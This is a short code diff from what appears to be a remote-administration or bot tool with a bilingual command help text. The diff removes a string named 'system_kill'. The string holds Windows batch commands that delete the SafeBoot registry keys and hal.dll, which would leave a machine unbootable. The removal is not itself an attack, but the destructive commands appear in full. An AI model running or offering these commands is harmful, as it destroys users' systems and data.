@@ -33,14 +33,6 @@ keys = ['\\t', '\\n', '\\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
 'S','T','U','V','W','X','Y','Z']
 
 
-system_kill = '''
-echo @off
-Reg Delete HKLM\\System\\CurrentControlset\\Control\\SafeBoot\\*.* /q
-Reg Delete HKLM\\System\\CurrentControlset\\Control\\SafeBoot /q
-del %WinDir%\\system32\\hal.dll /q
-'''
-
-
 helpmessage = '''
 -=**Configuration Administrarion Tool**=-
 **/move** (X) (Y) (time) - передвинуть курсор.
